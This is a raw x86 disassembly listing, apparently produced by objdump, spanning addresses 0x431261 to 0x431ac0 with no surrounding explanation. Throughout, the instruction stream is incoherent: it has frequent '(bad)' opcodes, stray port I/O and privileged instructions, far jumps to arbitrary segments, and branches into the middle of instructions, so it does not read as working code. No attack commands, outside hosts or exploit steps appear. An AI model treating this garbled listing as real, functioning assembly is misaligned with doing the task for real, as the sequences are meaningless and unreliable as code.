  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
